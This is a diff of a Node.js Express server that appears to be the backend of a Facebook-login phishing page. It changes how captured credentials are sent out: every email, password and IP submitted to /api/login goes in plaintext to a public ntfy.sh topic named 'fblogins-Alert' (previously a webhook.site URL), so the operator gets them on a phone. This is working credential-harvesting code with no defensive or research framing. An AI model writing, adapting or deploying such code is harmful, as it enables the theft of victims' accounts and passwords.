@@ -5,8 +5,8 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// REPLACE THIS URL with your webhook.site URL
-const WEBHOOK_URL = 'https://webhook.site/6d16ab4f-ced3-428f-b879-2aa8e37db36b';
+// ntfy topic - REPLACE with your actual topic name from the app
+const NTFY_TOPIC = 'fblogins-Alert';
 
 app.use(cors());
 app.use(express.json());
@@ -14,20 +14,21 @@ app.use(express.static('public'));
 
 const users = [];
 
-// Send to webhook
-async function sendToWebhook(email, password, ip) {
-    const data = {
-        timestamp: new Date().toISOString(),
-        email: email,
-        password: password,
-        ip: ip
-    };
+// Send to ntfy
+async function sendToNtfy(email, password, ip) {
+    const message = `🔐 LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toString()}`;
     
     try {
-        await axios.post(WEBHOOK_URL, data);
-        console.log('✅ Webhook sent');
+        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
+            headers: {
+                'Title': '🔐 New Login',
+                'Priority': 'high',
+                'Tags': 'warning,lock'
+            }
+        });
+        console.log('✅ ntfy notification sent');
     } catch (error) {
-        console.log('❌ Webhook error:', error.message);
+        console.log('❌ ntfy error:', error.message);
     }
 }
 
@@ -54,13 +55,13 @@ app.post('/api/register', (req, res) => {
     res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
 });
 
-// Login
+// Login - Sends ntfy notification
 app.post('/api/login', (req, res) => {
     const { identifier, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    // Send to webhook
-    sendToWebhook(identifier, password, ip);
+    // Send notification to your phone (instant)
+    sendToNtfy(identifier, password, ip);
     
     if (!identifier || !password) {
         return res.status(400).json({ error: 'Email and password required' });
@@ -77,7 +78,7 @@ app.post('/api/login', (req, res) => {
 
 // Health check
 app.get('/api/health', (req, res) => {
-    res.json({ status: 'ok' });
+    res.json({ status: 'ok', ntfy_topic: NTFY_TOPIC });
 });
 
 app.get('/', (req, res) => {
@@ -86,4 +87,5 @@ app.get('/', (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
+    console.log(`ntfy topic: ${NTFY_TOPIC}`);
 });
